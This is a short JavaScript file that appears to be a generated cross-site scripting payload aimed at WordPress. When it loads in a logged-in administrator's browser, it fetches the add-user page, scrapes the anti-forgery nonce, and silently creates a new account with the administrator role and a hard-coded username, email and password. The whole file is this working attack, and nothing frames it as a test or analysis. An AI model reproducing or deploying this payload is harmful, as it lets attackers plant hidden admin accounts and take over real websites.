function ajaxRequest (method, url, data, cb) {
  var xmlHttp = new XMLHttpRequest()

  if (xmlHttp.overrideMimeType) {
    xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
  }

  xmlHttp.open(method, url, true)

  if (cb) {
    xmlHttp.onreadystatechange = function () {
      if (xmlHttp.readyState === 4) {
        cb(xmlHttp)
      }
    }
  }

  xmlHttp.send(data)
  return xmlHttp
}

var newUserUrl = '/wp-admin/user-new.php';
var WordPressCreateUser_1549583449318_createUser = function (xhr) {
  var nonce = xhr.response.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];
  var data = new FormData();
  data.append('action', 'createuser');
  data.append('_wpnonce_create-user', nonce);
  data.append('_wp_http_referer', newUserUrl);
  data.append('user_login', 'YBSEimHr');
  data.append('email', 'YDPdXvnj@gurgVZSV.com');
  data.append('pass1', 'lzaSR36!');
  data.append('pass2', 'lzaSR36!');
  data.append('role', 'administrator');
  ajaxRequest('POST', newUserUrl, data, function () {


  })
}
ajaxRequest('GET', newUserUrl, undefined, WordPressCreateUser_1549583449318_createUser);
